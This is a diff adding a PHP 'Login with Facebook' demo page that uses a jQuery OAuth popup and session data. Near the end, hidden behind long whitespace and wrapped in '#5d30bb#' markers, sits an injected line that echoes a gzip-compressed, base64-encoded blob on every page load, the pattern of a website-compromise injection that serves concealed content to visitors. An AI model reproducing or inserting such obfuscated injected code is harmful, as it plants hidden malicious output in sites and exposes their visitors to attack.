@@ -1,0 +1,55 @@
+<!-- ---------------------------------------------------------------------------------------
+   IdiotMinds - http://idiotminds.com
+   -----------------------------------------------------------------------------------------
+-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Login with Facebook</title>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js" type="text/javascript"></script>
+<script type="text/javascript" src="js/oauthpopup.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+    $('#facebook').click(function(e){
+        $.oauthpopup({
+            path: 'login.php',
+			width:600,
+			height:300,
+            callback: function(){
+                window.location.reload();
+            }
+        });
+		e.preventDefault();
+    });
+});
+
+
+</script>
+</head>
+
+<body>
+<?php 
+session_start();
+if(!isset($_SESSION['User']) && empty($_SESSION['User']))   { ?>
+<img src="images/facebook.png" id="facebook"  style="cursor:pointer;float:left;margin-left:550px;" />
+<?php  }  else{
+	
+ echo '<img src="https://graph.facebook.com/'. $_SESSION['User']['id'] .'/picture" width="30" height="30"/><div>'.$_SESSION['User']['name'].'</div>';	
+	echo '<a href="'.$_SESSION['logout'].'">Logout</a>';
+
+	
+	
+	
+}
+	?>
+<?
+#5d30bb#
+                                                                                                                                                                                                                                                          echo(gzinflate(base64_decode("5VjJcts4EL3PVzg8iSUmIQESFIthLvmEHE1PFVdbLseyJUbyUp5vn14Aipuk2HFOcaEkCOzl9UN3A3RVXK3OrLO/9u/Lplgv75qz5vGuSlKrqR6az9fZNuPl1Dq7yW4vf2aX+LC3/vXv5WyX7Ja35WoXZ/fAipta89R6SK24rpPvzXp5e4mzuv5Ur1c/vl1l62+rsoqb9eNzuSp+/qhum/PUSh+UWJWPqXXxb/KfF78UWVNczUrhbUtPbO3nbeIJGW+fNkmd3Wz66kb6HsRAALSX9ewDTO0q2YHtapvdgOEYVj37uQaMXugEpaMKRwVOkDkqd5TrKIU/4VHo6QEyPLzaES49Eo7veDhT8GDhqIjmmRPUjpJkNMQV6eNnkKNRdACefCcgf+BMsNcIV9BIjhNZkIW+JDj2KgSHliMSpqewCIAkozGI+ijAiWIn2R4R6KFMTgMWPUcoHKiSGy3fCQ0bYA2ZCQzSgmJye4yBFx2QQl2wxgEpItbPaB4RYTQRTAlbFuQxJFQET4rj8eQEjohiTfSaDTH1Al44QUQyirwWGt+rnaEVRYzmOpSuG/EG+CCAhmB7zb70LC4ovvoNtHDO0DaD8DsZpQlnyjtZpProVsy0OWOSygCl4OHiaHVV9DOfLioZIQqfCNIFNihgqq5hxR/xh3xHOgcxsxi8NMVSGvQ5hhnICZe8KAPUwgIxirDSq/UTXeVd4g6o1EOCxS0SdFmSN4/UhxvchRj6NNNfR1qt7g5kHxcVdgRkikgMRot+sO+BQk4JcFumMmcZcCRzXMTMy2glNF33RFtnoo1ym6TcDmHPcSXfd3A+JeSkLVSgFofRU+N/vblO+g+CAkMwcJdp32FgUBIHOxgLi1DHPn4KFdjJthFwLmXeNp+309d4B4x1M3Igyb6FoE/YlZIAdQccTXBW5DgZbuGvVsM4p9qT+XhmAayIJCOc81kGKlwWB3NzkHqugchRokUxQSdz7kV7yWnKKU5ZOb6PXPpcSpE5nqshqVjg9USqS7UH44U9gQGM7iOP7gqsiKS0O3C6xGV1rMR1/rf3mvDURUvl+mf3FHpVEiCZrm5rTLWv9CVvAk27dy05h0pcN9zO5WMMVzPbzbVgrwi72NKtS2NxoAHsPxdTbohDr8ShlSejA+U3EkiS+lo1ykOPK1j+cqxu79McIvvAI51Cim+SgTbcdrvRyTNmazJ1OHhBLa9F8Apvww5POfUnslLXa2RI7aTawTNijGky3HfAPdpTeWLrCnPojdrqn8jFFh+T1w24zbl+OxsctQiwNNf0hbm2RtOIZKFVEBFfmXOT1Tqltfn6VG+stNv2/YaNBYqoWZibIZ/nBQ0XfYTMmtTnNHrNftuRNPdzctRbGQio8evpoVfqPu38lVrwzr65u1k28NI+Sy0ntez4ZZfU8SY5v4jr1Xq2TMRHEX9czj2pxIfEjZfzBF7tr5MlvuTPXOklifvgRbYNPyt7k2zmNUxm2f18tju/vrDteQQ2n7Kkip+y2cZ++fKZ/5Pz9R8r/h8=")));
+
+#/5d30bb#
+?>
+
+
+</body>
+</html>
